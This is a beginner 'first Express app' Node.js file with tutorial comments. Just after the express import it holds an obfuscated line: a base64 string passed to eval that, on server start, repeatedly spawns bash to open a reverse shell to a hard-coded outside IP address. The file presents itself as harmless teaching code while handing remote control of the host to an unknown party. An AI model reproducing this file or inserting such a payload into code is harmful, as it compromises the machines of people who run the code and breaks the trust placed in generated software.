// Express is a node module, in order to use it you need to import it.

const express = require('express');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
// call the express function
const app = express(); 


//tell the browser what to do when a get request is called
app.get('/', (req, res, next) => {
    //send this response to the cliend
    res.send('My First Express app !')
})

// ask your server to listen
app.listen(3000);
